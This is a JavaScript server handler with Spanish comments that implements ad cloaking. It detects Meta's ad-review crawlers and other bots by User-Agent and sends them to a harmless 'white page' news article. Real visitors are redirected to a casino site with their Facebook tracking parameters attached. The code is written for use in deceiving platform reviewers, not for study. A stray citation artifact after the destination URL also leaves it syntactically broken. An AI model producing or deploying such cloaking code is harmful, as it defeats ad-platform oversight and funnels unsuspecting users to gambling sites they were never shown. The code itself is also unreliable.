export default function handler(req, res) {
  // 1. Obtener la IP y el User-Agent del visitante
  const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
  const userAgent = req.headers['user-agent'] || '';
  
  // 2. Obtener todos los parámetros de tracking que vienen de Meta (?fbclid=..., ?utm_source=..., etc.)
  const queryParams = new URLSearchParams(req.query).toString();

  // Listas de detección rápida (Bots conocidos y empresas de hosting/Meta)
  const isBotUserAgent = /facebookexternalhit|Facebot|Googlebot|bingbot|Crawler|Puppeteer/i.test(userAgent);
  
  // Si la petición viene de un Bot de Meta o no es un dispositivo móvil real
  if (isBotUserAgent) {
    // Es un bot de revisión de Meta -> Lo mandamos a leer la noticia (White Page)
    res.writeHead(302, { Location: '/index.html' });
    return res.end();
  }

  // Si es un usuario real -> Lo redirigimos al casino arrastrando los parámetros de tracking (fbclid)
  const destinationUrl = `https://gana1290.site/g50lp2410${queryParams ? '?' + queryParams : ''}`[cite: 1];
  
  res.writeHead(302, { Location: destinationUrl });
  return res.end();
}